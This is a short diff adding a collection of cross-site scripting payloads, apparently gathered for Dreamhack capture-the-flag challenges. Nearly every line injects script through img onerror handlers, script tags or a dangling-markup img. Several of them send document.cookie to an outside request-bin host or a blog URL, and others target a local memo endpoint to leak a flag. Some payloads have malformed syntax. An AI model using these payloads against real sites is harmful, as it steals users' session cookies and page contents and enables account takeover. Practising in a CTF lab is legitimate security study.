@@ -1,0 +1,11 @@
+<img src="asdf" onerror="location.href='https://eny53a4ns79z.x.pipedream.net/'%20document.cookie;">
+<img src=x onerror=location.href=“http://127.0.0.1:8000/memo?memo=t1”+document.cookie>
+
+<script> document.location.href = 'https://ar9ang3.tistory.com/?param1=abc'-alert(document.cookie)-'def'; </script>
+
+<p><img src="https://eny53a4ns79z.x.pipedream.net//?data=</p>
+<p>This is a secret text.</p>
+<p id="x">AAA</p>
+
+<a href="http://host1.dreamhack.games:15567/memo?memo="<script>alert(document.cookie)</script></a>
+<img src=about: onerror="location.href='http://127.0.0.1:8000/memo?memo=FLAG IS'+document.cookie">
